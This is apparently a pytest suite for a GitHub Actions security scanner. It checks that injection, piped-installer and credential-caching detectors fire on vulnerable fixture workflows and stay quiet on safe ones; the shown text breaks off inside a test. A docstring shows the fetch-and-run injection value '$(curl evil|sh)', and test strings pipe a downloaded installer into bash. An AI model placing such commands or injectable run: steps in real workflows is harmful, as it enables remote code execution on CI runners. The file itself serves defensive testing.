"""Oracle test for the ci-secure scanner.

Runs ``scripts/scan.py`` against ``tests/fixtures/`` and asserts the
``{pattern: count}`` distribution matches the manifest below. Tightens
or loosens regression coverage by editing the manifest alongside the
relevant fixture / detector.

Run from the skill root:

    python -m pytest skills/ci-secure/tests/test_scan.py

or from this directory:

    pytest test_scan.py
"""

from __future__ import annotations

import json
import re
import subprocess
import sys
from collections import Counter
from pathlib import Path

import pytest

_SKILL_DIR = Path(__file__).resolve().parents[1]
# Put THIS tests dir on the path only for the duration of the shim import. A
# bare insert with no matching removal leaves ci-secure's tests dir shadowing
# same-named modules for the rest of the session — the global-state class the
# shim exists to avoid.
_TESTS_DIR = str(Path(__file__).resolve().parent)
sys.path.insert(0, _TESTS_DIR)
try:
    from _scan_import import assert_is_ci_secure, load_scan  # noqa: E402
finally:
    try:
        sys.path.remove(_TESTS_DIR)
    except ValueError:                          # pragma: no cover - defensive
        pass

scan = load_scan()
_FIXTURES = _SKILL_DIR / "tests" / "fixtures"
_SCAN_SCRIPT = _SKILL_DIR / "scripts" / "scan.py"


def test_the_scan_module_under_test_is_ci_secures_own() -> None:
    """Which file won. `scan.py` is a colliding module name across the skills
    in this repo; every assertion below is worthless if a sibling's copy is the
    one that got loaded."""
    assert Path(scan.__file__).resolve().parents[1].name == "ci-secure"
    assert_is_ci_secure(scan)


def _scan_dir(root: Path) -> dict:
    """Run scan.py against an arbitrary root and return the parsed JSON.

    Subprocess (not import) to mirror real invocation. Skips if PyYAML is
    absent, matching the corpus fixtures. Used by the per-detector tests
    below, which construct minimal workflows in a tmp dir so each detector
    has self-contained positive/negative coverage independent of the shared
    fixture corpus and its aggregate manifest.
    """
    if subprocess.run(
        [sys.executable, "-c", "import yaml"], capture_output=True, text=True,
    ).returncode != 0:
        pytest.skip("PyYAML not installed in the test runner")
    result = subprocess.run(
        [sys.executable, str(_SCAN_SCRIPT), "--root", str(root), "--gh-impostor", "off"],
        capture_output=True, text=True, check=True,
    )
    return json.loads(result.stdout)


def _write_workflow(root: Path, name: str, content: str) -> None:
    wf_dir = root / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / name).write_text(content, encoding="utf-8")


def _patterns_for_file(data: dict, basename: str) -> set[str]:
    """Patterns that fired on a specific workflow file (excludes repo-wide)."""
    return {
        f["pattern"] for f in data["findings"]
        if f.get("workflow_file", "").endswith(basename)
    }


def _all_patterns(data: dict) -> set[str]:
    return {f["pattern"] for f in data["findings"]}

# Expected pattern → finding-count manifest. Update alongside the fixture
# that exercises a new detector branch. Cross-pattern findings (e.g. a
# template-injection fixture that also fires P14.1) are counted under
# every pattern they hit.
EXPECTED_COUNTS = {
    "P14.7": 1,
    "P14.9": 1,
    "P14.10": 9,
    "P14.14": 3,
    "P14.15": 2,
    "P14.18": 1,
    "P14.19": 1,
    # 1 piped-installer occurrence + 1 mutable-fetch-then-execute occurrence:
    # the vector's two shapes, one positive fixture each. Its two negative
    # controls (a full-40-hex-pinned clone, a fetch nothing executes from)
    # must contribute nothing.
    "P14.24": 2,
    # 1 from the P14.25 positive fixture + 2 from
    # p14_8_workflow_scope_id_token.yml, whose two jobs each run `npm ci`
    # under a workflow-scope `id-token: write` — a real payoff, not an
    # artifact of the fixture being written for a removed pattern.
    "P14.25": 3,
    # P14.11 is network-gated and forced off in these offline tests — its
    # loud-skip contract is covered in test_chain_detectors.py.
}


@pytest.fixture(scope="module")
def scan_findings() -> list[dict]:
    yaml_check = subprocess.run(
        [sys.executable, "-c", "import yaml"],
        capture_output=True,
        text=True,
    )
    if yaml_check.returncode != 0:
        pytest.skip("PyYAML not installed in the test runner")

    result = subprocess.run(
        [sys.executable, str(_SCAN_SCRIPT), "--root", str(_FIXTURES),
         "--gh-impostor", "off"],
        capture_output=True,
        text=True,
        check=True,
    )
    return json.loads(result.stdout)["findings"]


def test_finding_count_matches_manifest(scan_findings: list[dict]) -> None:
    counts = Counter(f["pattern"] for f in scan_findings)
    assert dict(counts) == EXPECTED_COUNTS, (
        f"Detector output drifted from manifest.\n"
        f"  expected: {EXPECTED_COUNTS}\n"
        f"  actual:   {dict(counts)}"
    )


# Fixture files named for patterns the descope REMOVED. They are kept
# deliberately: they are the negative space of the ten-vector catalog — the
# shapes a reader might assume ci-secure still flags. `p14_1_*` (dangerous
# triggers), `p14_3_*` (broad workflow permissions), `p14_5_*` (scanner
# lock-in), `p14_12_*` (long-lived cloud creds), `p14_16_*` (checkout
# credential persistence), `p14_17_*` (`secrets: inherit`), `p14_22_*` (broad
# artifact upload), `p14_23_*` (malformed `if:`), `p5_1_*` (unpinned actions),
# `p8_3_*` (cache in a publish job) and the CODEOWNERS file all describe
# presence-shaped hygiene, not an outsider -> compromise chain. None of the
# ten may fire *because of* those shapes.
_DROPPED_PATTERN_FIXTURE_STEMS = (
    "p14_1_", "p14_3_", "p14_5_", "p14_12_", "p14_16_",
    "p14_17_", "p14_22_", "p14_23_", "p5_1_", "p8_3_",
)


def test_dropped_pattern_fixtures_produce_no_findings_of_their_own(
    scan_findings: list[dict],
) -> None:
    """The dropped-shape fixtures are negative space, and this asserts it.

    ``EXPECTED_COUNTS`` pins the exact distribution, so anything these files
    provoke lands there — but a re-admitted hygiene check that also shifted a
    count elsewhere could hide in the total. Name the allowed set instead: the
    only hits these files legitimately carry are incidental P14.10 ones (a
    fixture written for a removed pattern that also embeds a real `run:`
    template injection, e.g. `p14_1_string_trigger.yml`). Any other pattern
    firing on a dropped shape means a removed hygiene check crept back in.
    """
    by_stem: dict[str, set[str]] = {}
    for f in scan_findings:
        wf = f.get("workflow_file", "")
        for stem in _DROPPED_PATTERN_FIXTURE_STEMS:
            if stem in wf:
                by_stem.setdefault(stem, set()).add(f["pattern"])
    unexpected = {
        stem: sorted(pats - {"P14.10"})
        for stem, pats in by_stem.items()
        if pats - {"P14.10"}
    }
    assert not unexpected, (
        "a dropped-pattern fixture provoked a finding beyond the incidental "
        f"P14.10 co-occurrence — a removed hygiene check is back: {unexpected}"
    )


def test_network_gated_pattern_absent_when_the_check_did_not_run(
    scan_findings: list[dict],
) -> None:
    """P14.11 is the one network-gated chain, and this fixture scan runs
    without it enabled — so it must contribute no findings here. The caller
    learns the check was skipped from `gh_checks`, never from silence (proven
    in test_chain_detectors.py::test_scan_records_loud_skip_when_gh_unavailable).

    This replaces an older assertion that P14.11 was `detector: manual` and
    could never fire at all. That is no longer true — P14.11 has a real
    detector — so the old test asserted the opposite of the shipped contract
    and would have gone red the first time the check actually ran. It also
    asserted on P14.6, a pattern the descope removed, which could never fail.
    """
    patterns = {f["pattern"] for f in scan_findings}
    assert "P14.11" not in patterns, (
        "the impostor-SHA check did not run for this fixture, so it must not "
        "have produced findings"
    )


def test_total_finding_count(scan_findings: list[dict]) -> None:
    assert len(scan_findings) == sum(EXPECTED_COUNTS.values())


def test_p1410_does_not_fire_inside_with_blocks(scan_findings: list[dict]) -> None:
    """P14.10 must scope itself to ``run:`` scalars, not ``with:`` inputs.

    Locks in the 2026-05-13 fix that moved P14.10 from a plain regex
    (any occurrence of ``${{ github.event.* }}``) to a `yaml-run-injection`
    detector. The P14.1 negative fixture has a ``with:`` block whose
    value is ``${{ github.event.issue.number }}``; that's an action
    input, not a shell sink, and must not fire.
    """
    offenders = [
        f
        for f in scan_findings
        if f["pattern"] == "P14.10"
        and "p14_1_negative_permission_lookalike" in f["workflow_file"]
    ]
    assert offenders == [], (
        "P14.10 fired on a `with:` block input: "
        f"{[(f['workflow_file'], f['line']) for f in offenders]}"
    )


def test_p1410_line_attribution_skips_env_block(scan_findings: list[dict]) -> None:
    """The reported line must be the ``run:`` occurrence, not an earlier
    ``env:`` occurrence of the same template expression.

    Locks in the 2026-05-13 forward-cursor fix to
    `detect_yaml_run_injection`. The fixture intentionally places the
    same expression in `env:` (line 22) and `run:` (line 27); only the
    run-block sink should be reported.
    """
    hits = [
        f
        for f in scan_findings
        if f["pattern"] == "P14.10" and "p14_10_line_attribution" in f["workflow_file"]
    ]
    assert len(hits) == 1, f"Expected exactly 1 hit, got {len(hits)}"
    line = hits[0]["line"]
    assert line >= 25, (
        f"P14.10 reported line {line}; should be the run: line "
        f"(>= 25), not the env: line (22)"
    )


def test_p1410_covers_all_documented_sinks(scan_findings: list[dict]) -> None:
    """P14.10 must catch every sink the catalog prose names as in-scope — and
    only those.

    The fixture carries four template-injection lines. Three are in scope
    (`github.event.head_commit.*`, `github.event.inputs.*`,
    `github.event.client_payload.*`); the fourth, bare `inputs.*`, is
    deliberately NOT (see the negative test below).
    """
    hits_on_sinks = [
        f
        for f in scan_findings
        if f["pattern"] == "P14.10" and "p14_10_new_sinks" in f["workflow_file"]
    ]
    assert len(hits_on_sinks) == 3, (
        f"Expected 3 P14.10 hits on the new-sinks fixture, got {len(hits_on_sinks)}"
    )


def test_p1410_does_not_fire_on_bare_workflow_call_inputs(tmp_path: Path) -> None:
    """Bare `${{ inputs.x }}` in a `run:` block must NOT fire.

    It resolves to a `workflow_call` input, which only a caller with write
    access to a workflow file in this repo can set — an insider, not the
    outsider the catalog's admission test requires. Every other pattern here
    starts at someone with no repo access, so keeping this one would have
    made P14.10 the exception. The `workflow_dispatch` spelling
    (`github.event.inputs.*`) IS a sink and must still fire.
    """
    _write_workflow(tmp_path, "reusable.yml", (
        "on:\n"
        "  workflow_call:\n"
        "    inputs:\n"
        "      env_name:\n"
        "        type: string\n"
        "jobs:\n"
        "  deploy:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        '      - run: echo "deploying to ${{ inputs.env_name }}"\n'
    ))
    assert "P14.10" not in _patterns_for_file(_scan_dir(tmp_path), "reusable.yml")

    dispatch_root = tmp_path / "dispatch"
    _write_workflow(dispatch_root, "reusable.yml", (
        "on:\n"
        "  workflow_dispatch:\n"
        "    inputs:\n"
        "      env_name:\n"
        "        required: true\n"
        "jobs:\n"
        "  deploy:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        '      - run: echo "deploying to ${{ github.event.inputs.env_name }}"\n'
    ))
    assert "P14.10" in _patterns_for_file(
        _scan_dir(dispatch_root), "reusable.yml"
    ), "the workflow_dispatch sink must still fire"


def test_p1410_ignores_github_generated_value_shape_safe_fields(tmp_path: Path) -> None:
    """django / infisical shape: a `run:` step interpolating `${{
    github.event.pull_request.number }}` and the sha/boolean family.

    These are GitHub-generated values — an integer, a 40-hex object id, a
    boolean — with no room for a shell metacharacter. Flagging them made a
    whole repo's report (infisical: 2 of 2 findings) false HIGHs and buried
    the text-shaped sinks that are real.
    """
    _write_workflow(tmp_path, "safe_fields.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  check:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: |\n"
        "          git fetch origin "
        "pull/${{ github.event.pull_request.number }}/head:pr\n"
        "          git checkout ${{ github.event.pull_request.head.sha }}\n"
        "          echo base ${{ github.event.pull_request.base.sha }}\n"
        "          echo fork ${{ github.event.pull_request.head.repo.fork }}\n"
        "          echo merged ${{ github.event.pull_request.merged }}\n"
        "          echo run ${{ github.event.workflow_run.id }}\n"
        "          echo who ${{ github.event.issue.user.login }}\n"
        "          echo by ${{ github.event.sender.login }}\n"
    ))
    assert "P14.10" not in _patterns_for_file(_scan_dir(tmp_path), "safe_fields.yml")

    text_root = tmp_path / "text"
    _write_workflow(text_root, "safe_fields.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  check:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: |\n"
        "          echo number ${{ github.event.pull_request.number }}\n"
        "          echo title ${{ github.event.pull_request.title }}\n"
    ))
    data = _scan_dir(text_root)
    hits = [
        f for f in data["findings"]
        if f["pattern"] == "P14.10" and f["workflow_file"].endswith("safe_fields.yml")
    ]
    assert len(hits) == 1, (
        "a PR title on the same step is still a shell-injection sink and must "
        f"fire exactly once; got {[(h['line'], h['evidence']) for h in hits]}"
    )
    assert "title" in hits[0]["evidence"]


def test_p1410_shape_safe_names_do_not_excuse_caller_filled_fields(
    tmp_path: Path,
) -> None:
    """`client_payload.sha` and `github.event.inputs.sha` must still fire.

    The value-shape exclusion holds only where GitHub fills the field in.
    `repository_dispatch` bodies and `workflow_dispatch` inputs are filled in by
    whoever fired the event, so a key spelled `sha`, `id` or `number` there is
    just a name an attacker chose to be reassuring — the value can be
    `$(curl evil|sh)`. Suppressing these silenced a live RCE sink.
    """
    _write_workflow(tmp_path, "dispatch.yml", (
        "on:\n"
        "  repository_dispatch:\n"
        "    types: [build]\n"
        "  workflow_dispatch:\n"
        "    inputs:\n"
        "      sha:\n"
        "        required: true\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: git checkout ${{ github.event.client_payload.sha }}\n"
        "      - run: echo id ${{ github.event.client_payload.id }}\n"
        "      - run: echo num ${{ github.event.client_payload.number }}\n"
        "      - run: echo built ${{ github.event.inputs.sha }}\n"
        # A `.login` under a caller-filled prefix is NOT the GitHub-enforced
        # login charset — the caller invented the key — so it stays a sink.
        "      - run: echo who ${{ github.event.client_payload.user.login }}\n"
    ))
    hits = [
        f for f in _scan_dir(tmp_path)["findings"]
        if f["pattern"] == "P14.10" and f["workflow_file"].endswith("dispatch.yml")
    ]
    assert len(hits) == 5, (
        "every caller-filled field is a sink whatever it is named; got "
        f"{[(h['line'], h['evidence']) for h in hits]}"
    )


def test_p1410_modern_bare_inputs_context_is_caller_filled(
    tmp_path: Path,
) -> None:
    """`inputs.sha` — the modern `workflow_dispatch` / `workflow_call`
    spelling — is filled in by the caller exactly like the legacy
    `github.event.inputs.sha`. The allowlist only knew the legacy spelling,
    so a repo written the modern way had its input sinks suppressed by name.
    """
    assert not scan._is_shape_safe_expression("${{ inputs.sha }}")
    assert not scan._is_shape_safe_expression("${{ inputs.pr.head_sha }}")
    # Named in the caller-filled list in its own right. Today the
    # `github.*` anchor also rules it out, so this is belt AND braces — but the
    # list is what the catalog is checked against, and what a future change to
    # the anchor rule would be measured by.
    assert "inputs." in scan._ATTACKER_FILLED_PREFIXES


def test_shape_safe_allowlist_only_ever_touches_template_expressions() -> None:
    """The exclusion is an argument about `${{ … }}` VALUE SHAPES.

    The same run-scalar detector also carries the shell-command patterns
    (`curl … | bash`). Running a `${{ }}`-shaped allowlist over arbitrary shell
    text means one unlucky future suffix silently suppresses a HIGH finding —
    so anything that is not a template expression is never shape-safe.
    """
    assert not scan._is_shape_safe_expression(
        'curl -fsSL "<installer-url>" | bash')
    # The mutation canary: shell text that CONTAINS a live `_SAFE_EXPR_SUFFIXES`
    # member (`.merged`). If the `${{`-prefix gate were ever relaxed to a
    # containment check, this line — not the one above — is what fails.
    assert not scan._is_shape_safe_expression(
        'curl -fsSL "<installer-url>/toolchain.merged" | bash')
    assert not scan._is_shape_safe_expression("git rev-parse HEAD > out.sha")
    # The load-bearing case for the gate specifically: text that WOULD pass
    # every downstream rule — a fully-qualified `github.*` path with a
    # shape-safe suffix — but is not a template expression at all, so no
    # substitution is happening and the value-shape argument does not apply.
    assert not scan._is_shape_safe_expression(
        "github.event.pull_request.number")
    assert not scan._is_shape_safe_expression(
        "echo github.event.pull_request.head.sha")
    # And the real thing still is.
    assert scan._is_shape_safe_expression(
        "${{ github.event.pull_request.number }}")


def test_shape_safe_suffixes_are_anchored_to_github_context_paths() -> None:
    """A bare `endswith` suppressed ANY text ending in `.sha`. The exclusion
    is only sound for a fully-qualified `github.*` context path."""
    assert not scan._is_shape_safe_expression("${{ steps.x.outputs.sha }}")
    assert not scan._is_shape_safe_expression("${{ env.BRANCH_ID }}")
    assert scan._is_shape_safe_expression(
        "${{ github.event.pull_request.head.sha }}")


def test_text_shaped_suffixes_still_fire_by_name() -> None:
    """`.ref` and `.title` are text. Only an aggregate corpus count would have
    noticed either one drifting into the allowlist."""
    assert not scan._is_shape_safe_expression("${{ github.head_ref }}")
    assert not scan._is_shape_safe_expression(
        "${{ github.event.pull_request.head.ref }}")
    assert not scan._is_shape_safe_expression(
        "${{ github.event.issue.title }}")


def test_every_fallback_operand_is_judged_not_only_the_first() -> None:
    """Review finding: judging only the FIRST operand of `${{ A || B }}`
    assumes A is always truthy. It is not — an event field absent on THIS
    event is empty, and then B is what reaches the shell. Every operand has to
    be shape-safe for the expression to be.
    """
    # The gap: a shape-safe but FALSY-able primary with attacker text behind
    # it. On an `issues` trigger there is no pull_request object at all.
    assert not scan._is_shape_safe_expression(
        "${{ github.event.pull_request.number || github.event.issue.title }}")
    assert not scan._is_shape_safe_expression(
        "${{ github.event.pull_request.merged || github.event.issue.body }}")
    assert not scan._is_shape_safe_expression(
        "${{ github.event.pull_request.head.sha || "
        "github.event.head_commit.message }}")
    assert not scan._is_shape_safe_expression(
        "${{ github.event.workflow_run.id || github.event.client_payload.cmd }}")
    # The cal.com case this `||` support was added for — a text-shaped primary
    # is not laundered by a safe fallback.
    assert not scan._is_shape_safe_expression(
        "${{ github.head_ref || github.ref_name }}")
    assert not scan._is_shape_safe_expression(
        "${{ github.event.pull_request.title || '' }}")
    assert not scan._is_shape_safe_expression(
        "${{ github.event.issue.title || github.sha }}")
    # Counter-guard: every operand shape-safe (or an author-written literal)
    # stays excluded, or the fix would flag every fallback in existence.
    assert scan._is_shape_safe_expression(
        "${{ github.event.pull_request.number || 0 }}")
    assert scan._is_shape_safe_expression(
        "${{ github.event.pull_request.number || github.event.issue.number }}")
    assert scan._is_shape_safe_expression(
        "${{ github.event.pull_request.merged || 'false' }}")


def test_the_allowlist_matches_the_catalog_prose_that_documents_it() -> None:
    """The code's exclusion lists and the catalog's sentence describing them
    can drift silently — and did: the catalog named a `github.event.action`
    exclusion the P14.10 regex can never match, describing a false-positive
    class that never existed. Every field the catalog claims is excluded must
    actually be excluded, and every namespace it claims is never excluded must
    actually still fire.
    """
    catalog = (_SKILL_DIR / "references" / "security-patterns.md").read_text(
        encoding="utf-8")
    sentence = next(
        ln for ln in catalog.splitlines()
        if ln.startswith("**Anti-pattern**") and "value shape" in ln
    )
    excluded = sentence.split("The exclusion only ever applies")[0]
    _, sep, caller_filled = sentence.partition("The exclusion also turns on")
    assert sep, "the catalog sentence no longer names its caller-filled clause"
    # Every `.suffix` the prose claims is excluded really is.
    claimed = re.findall(r"`(\.[A-Za-z_.]+)`", excluded)
    assert claimed, "the catalog sentence lists no excluded suffixes"
    for suffix in claimed:
        expr = "${{ github.event.pull_request" + suffix + " }}"
        assert scan._is_shape_safe_expression(expr), (
            f"the catalog says {suffix} is excluded, but the code still "
            f"flags {expr}"
        )
    # Every code suffix is documented.
    for suffix in scan._SAFE_EXPR_SUFFIXES:
        assert f"`{suffix}`" in excluded or any(
            c.endswith(suffix) for c in claimed
        ), f"the code excludes {suffix} and the catalog never says so"
    # Every namespace the prose calls caller-filled is still in scope.
    namespaces = re.findall(r"`([A-Za-z_.]+)\.\*`", caller_filled)
    assert namespaces, "the catalog names no caller-filled namespaces"
    for ns in namespaces:
        assert f"{ns}." in scan._ATTACKER_FILLED_PREFIXES, (
            f"the catalog says {ns}.* is never excluded, but the code's "
            f"attacker-filled prefixes are {scan._ATTACKER_FILLED_PREFIXES}"
        )
    for prefix in scan._ATTACKER_FILLED_PREFIXES:
        assert f"`{prefix}*`" in caller_filled, (
            f"the code never excludes {prefix}* and the catalog never says so"
        )
    # The P14.10 regex only matches `github.event.<issue|comment|pull_request|
    # discussion|workflow_run|head_commit|inputs|client_payload>.*`,
    # `github.event.inputs.*` and `github.head_ref`. A bare
    # `github.event.action` is not a match, so an "exclusion" for it describes
    # a false-positive class that never existed.
    assert "github.event.action" not in sentence, (
        "github.event.action is not a P14.10 match and must not be described "
        "as an exclusion"
    )


def test_two_distinct_sinks_on_one_line_are_both_named(
    tmp_path: Path,
) -> None:
    """One line, two DIFFERENT injectable expressions.

    Occurrences dedupe by (pattern, file, line) — right, because it is one line
    to fix. But the kept finding named only the first expression and the second
    vanished, so a reader who fixed what the finding named left a live sink on
    the same line.
    """
    _write_workflow(tmp_path, "two_sinks.yml", (
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  check:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        '      - run: echo "${{ github.event.issue.title }} '
        '${{ github.head_ref }}"\n'
    ))
    hits = [
        f for f in _scan_dir(tmp_path)["findings"]
        if f["pattern"] == "P14.10" and f["workflow_file"].endswith("two_sinks.yml")
    ]
    assert len(hits) == 1, f"one line is one occurrence; got {len(hits)}"
    evidence = hits[0]["evidence"]
    assert "github.event.issue.title" in evidence
    assert "github.head_ref" in evidence, (
        "the second sink on the line was dropped without a trace: "
        f"{evidence!r}"
    )
    assert "<-- here:" in evidence, (
        "the kept finding must NAME both matched expressions, not just quote "
        f"a line that happens to contain them: {evidence!r}"
    )


# -----------------------------------------------------------------------------
# Negative-fixture assertions
#
# Each test below pins one fixture to "must produce zero findings for its
# target pattern". The aggregate manifest above would still catch a
# scanner regression that moved the count globally, but a future change
# that re-broke ONE detector branch could be hidden by an offsetting
# change elsewhere. Per-fixture assertions remove that risk.
# -----------------------------------------------------------------------------


def _findings_for(
    scan_findings: list[dict], pattern: str, fixture_stem: str
) -> list[dict]:
    return [
        f
        for f in scan_findings
        if f["pattern"] == pattern and fixture_stem in f["workflow_file"]
    ]


def test_no_p1410_on_safe_extraction(scan_findings: list[dict]) -> None:
    """P14.10 must not fire when `github.event.*` lives only in env: / with:."""
    offenders = _findings_for(
        scan_findings, "P14.10", "p14_10_negative_safe_extraction"
    )
    assert offenders == [], (
        "P14.10 fired on the safe-extraction fixture: "
        f"{[(f['workflow_file'], f['line']) for f in offenders]}"
    )


def test_no_p1414_on_narrow_tojson(scan_findings: list[dict]) -> None:
    """P14.14 must require the closing paren to follow `secrets|github|env` directly."""
    offenders = _findings_for(
        scan_findings, "P14.14", "p14_14_negative_narrow_tojson"
    )
    assert offenders == [], (
        "P14.14 fired on a narrow toJSON expression: "
        f"{[(f['workflow_file'], f['line']) for f in offenders]}"
    )


def test_no_p1415_on_safe_env_write(scan_findings: list[dict]) -> None:
    """P14.15 must not fire when no untrusted-source expression is on the redirect line."""
    offenders = _findings_for(
        scan_findings, "P14.15", "p14_15_negative_safe_env_write"
    )
    assert offenders == [], (
        "P14.15 fired on a safe env/path write: "
        f"{[(f['workflow_file'], f['line']) for f in offenders]}"
    )


def test_no_p1424_on_download_then_verify(scan_findings: list[dict]) -> None:
    """P14.24 must not fire when a script is downloaded, checksum-verified,
    then run locally (no fetch-and-pipe-to-shell)."""
    offenders = _findings_for(
        scan_findings, "P14.24", "p14_24_negative_download_then_verify"
    )
    assert offenders == [], (
        "P14.24 fired on download-then-verify: "
        f"{[(f['workflow_file'], f['line']) for f in offenders]}"
    )


def test_no_p1419_on_safe_cache_path(scan_findings: list[dict]) -> None:
    """P14.19 must distinguish a credential file (~/.npmrc) from a benign
    cache dir (~/.npm) — the safe-path fixture must stay silent."""
    offenders = _findings_for(
        scan_findings, "P14.19", "p14_19_negative_safe_cache_path"
    )
    assert offenders == [], (
        "P14.19 fired on a safe cache path: "
        f"{[(f['workflow_file'], f['line']) for f in offenders]}"
    )


def test_p1419_fires_on_credential_cache_path(scan_findings: list[dict]) -> None:
    """P14.19 (yaml-job-correlated: credential-file-in-cache-or-artifact)
    must fire when a cache/upload path is a known credential file."""
    hits = _findings_for(scan_findings, "P14.19", "p14_19_credential_in_cache_path")
    assert len(hits) == 1, f"Expected exactly 1 P14.19 hit, got {len(hits)}: {hits}"


def test_p147_fires_on_pr_target_with_cache(scan_findings: list[dict]) -> None:
    """P14.7 (yaml-workflow-correlated: untrusted-trigger-writes-cache)
    must fire when `pull_request_target` coexists with a cache-writing
    step in any job."""
    hits = _findings_for(scan_findings, "P14.7", "p14_7_pr_target_writes_cache")
    assert len(hits) == 1, (
        f"Expected exactly 1 P14.7 hit, got {len(hits)}: {hits}"
    )


def test_unparseable_workflow_is_a_coverage_gap_not_silently_clean(
    tmp_path: Path,
) -> None:
    """A workflow that fails to YAML-parse must surface as an explicit
    coverage gap, never be silently reported as clean.

    Regression for the false-negative where a file the static detectors
    couldn't parse fired ZERO findings yet was counted as scanned: a repo
    owner reading the report would believe a file with HIGH issues passed
    every check when it was never evaluated. The broken fixture below
    carries both an `on: pull_request_target` trigger (P14.1) and a
    `${{ github.event.* }}` run injection (P14.10) precisely to prove the
    gap is surfaced even when real issues are present in the raw text.
    """
    yaml_check = subprocess.run(
        [sys.executable, "-c", "import yaml"], capture_output=True, text=True,
    )
    if yaml_check.returncode != 0:
        pytest.skip("PyYAML not installed in the test runner")

    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    # Unterminated flow sequence on the last line → guaranteed ParserError.
    (wf_dir / "broken.yml").write_text(
        "name: broken\n"
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo ${{ github.event.issue.title }}\n"
        "matrix: [a, b\n",
        encoding="utf-8",
    )
    (wf_dir / "clean.yml").write_text(
        "on: push\n"
        "jobs:\n"
        "  noop:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo hi\n",
        encoding="utf-8",
    )

    result = subprocess.run(
        [sys.executable, str(_SCAN_SCRIPT), "--root", str(tmp_path)],
        capture_output=True, text=True, check=True,
    )
    data = json.loads(result.stdout)

    gaps = data.get("scan_incomplete", [])
    gap_files = {g["workflow_file"] for g in gaps}
    assert ".github/workflows/broken.yml" in gap_files, (
        "unparseable workflow must be recorded in scan_incomplete, not omitted"
    )
    # A parseable file must NOT be flagged as a gap (no false coverage gaps).
    assert ".github/workflows/clean.yml" not in gap_files
    # The reason must say it wasn't scanned, so a reader can't read it as clean.
    broken_gap = next(
        g for g in gaps if g["workflow_file"].endswith("broken.yml")
    )
    assert "parse" in broken_gap["reason"].lower()
    # "scanned" counts discovered files including the unscannable one — which
    # is exactly why the gap surface (not the count) is what proves coverage.
    assert data["scanned_workflows"] == 2
    # The key is always present (empty list when every file parsed) so
    # report.py can rely on it.
    assert "scan_incomplete" in data


# -----------------------------------------------------------------------------
# Per-detector positive+negative coverage for detectors that previously had
# only incidental positive coverage (fired via another pattern's fixture) and
# no false-positive guard: P5.5, P8.4, P14.18. Constructed in a tmp dir so the
# intent is self-documenting and independent of the shared-corpus manifest.
# -----------------------------------------------------------------------------

_MINIMAL_JOB = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - run: echo hi\n"
)


def test_non_mapping_yaml_is_a_coverage_gap_not_clean(tmp_path: Path) -> None:
    """A workflow file that is valid YAML but NOT a top-level mapping (a list or
    scalar) can't be evaluated by any YAML-based detector (they all bail on
    `not isinstance(doc, dict)`). It must be recorded as a coverage gap in
    `scan_incomplete`, never reported as scanned-clean — that silent false-clean
    is the cardinal sin for a security scanner."""
    _write_workflow(tmp_path, "list.yml", "- a\n- b\n")           # top-level list
    _write_workflow(tmp_path, "scalar.yml", "just a string\n")     # top-level scalar
    _write_workflow(tmp_path, "ok.yml", "on: push\njobs:\n  b:\n    runs-on: x\n")
    data = _scan_dir(tmp_path)
    gapped = {
        e.get("workflow_file", "").rsplit("/", 1)[-1]
        for e in data.get("scan_incomplete", [])
    }
    assert "list.yml" in gapped, "top-level-list workflow not flagged as a coverage gap"
    assert "scalar.yml" in gapped, "top-level-scalar workflow not flagged as a coverage gap"
    assert "ok.yml" not in gapped, "a valid mapping must not be flagged as a gap"


def test_p1418_fires_on_pr_write_under_untrusted_trigger_not_safe(tmp_path: Path) -> None:
    """P14.18 — `pull-requests: write` under an untrusted trigger
    (`pull_request_target`) fires; the same write under a safe trigger
    (`push`) does not."""
    danger = (
        "on: pull_request_target\n"
        "permissions:\n"
        "  pull-requests: write\n"
        + _MINIMAL_JOB
    )
    _write_workflow(tmp_path, "pr.yml", danger)
    assert "P14.18" in _patterns_for_file(_scan_dir(tmp_path), "pr.yml")

    safe_root = tmp_path / "safe"
    safe = danger.replace("on: pull_request_target\n", "on: push\n")
    _write_workflow(safe_root, "pr.yml", safe)
    assert "P14.18" not in _patterns_for_file(_scan_dir(safe_root), "pr.yml")


# -----------------------------------------------------------------------------
# Coverage failures: a scan that could not check what it claims to have checked
# must EXIT NON-ZERO, never emit a clean-looking result. Each test below is
# red-proven against the bug it covers.
# -----------------------------------------------------------------------------


def _catalog_copy(tmp_path: Path, mangle: tuple[str, str] | None = None) -> Path:
    """Copy the shipped catalog, optionally applying one substitution."""
    src = (_SKILL_DIR / "references" / "security-patterns.md").read_text(
        encoding="utf-8"
    )
    if mangle is not None:
        old, new = mangle
        assert old in src, f"mangle target not found in the catalog: {old!r}"
        src = src.replace(old, new, 1)
    dest = tmp_path / "catalog.md"
    dest.write_text(src, encoding="utf-8")
    return dest


def _scan_with_catalog(root: Path, catalog: Path):
    return subprocess.run(
        [sys.executable, str(_SCAN_SCRIPT), "--root", str(root),
         "--catalog", str(catalog), "--gh-impostor", "off"],
        capture_output=True, text=True,
    )


def test_mangled_correlation_id_is_a_loud_exit_not_a_dropped_chain(
    tmp_path: Path,
) -> None:
    """A one-character typo in a `correlation:` id used to `continue` past the
    entry with a log warning.

    The chain then simply never ran: no findings, no gap, and a report that
    said the repo was clean of a pattern nobody evaluated. The fixture below
    is a workflow that DOES trip P14.9, so a passing scan here would be an
    outright false negative. Strict load turns it into exit 1.
    """
    _write_workflow(tmp_path, "pwn.yml", (
        "on: pull_request_target\n"
        "jobs:\n"
        "  bench:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "        with:\n"
